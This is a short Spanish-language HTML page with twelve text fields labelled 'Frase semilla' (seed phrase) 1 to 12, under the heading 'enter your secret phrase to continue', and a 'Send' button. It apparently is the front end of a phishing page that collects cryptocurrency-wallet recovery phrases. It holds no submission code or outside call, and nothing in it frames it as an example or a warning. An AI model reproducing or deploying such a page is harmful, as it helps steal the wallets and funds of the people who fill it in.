<!DOCTYPE html>
<html>
  <head>
    <style>
      .container {
        display: flex;
        flex-wrap: wrap;
        background-color: #1c2331;
        color: #0c5460;
        padding: 20px;
      }
      
      .box {
        width: 25%;
        padding: 20px;
        text-align: center;
      }
      
      h3 {
        font-weight: bold;
        font-size: 18px;
        margin-bottom: 20px;
      }
      
      button {
        padding: 10px 20px;
        background-color: #0c5460;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h3>Coloque su frase secreta para continuar</h3>
      <div class="box">
        <input type="text" placeholder="Frase semilla 1"></input><br><br>
        <input type="text" placeholder="Frase semilla 2"></input><br><br>
        <input type="text" placeholder="Frase semilla 3"></input><br><br>
        <input type="text" placeholder="Frase semilla 4"></input>
      </div>
      <div class="box">
        <input type="text" placeholder="Frase semilla 5"></input><br><br>
        <input type="text" placeholder="Frase semilla 6"></input><br><br>
        <input type="text" placeholder="Frase semilla 7"></input><br><br>
        <input type="text" placeholder="Frase semilla 8"></input>
      </div>
      <div class="box">
        <input type="text" placeholder="Frase semilla 9"></input><br><br>
        <input type="text" placeholder="Frase semilla 10"></input><br><br>
        <input type="text" placeholder="Frase semilla 11"></input><br><br>
        <input type="text" placeholder="Frase semilla 12"></input>
      </div>
      <div class="box">
        <button type="submit">Enviar</button>
      </div>
    </div>
  </body>
</html>
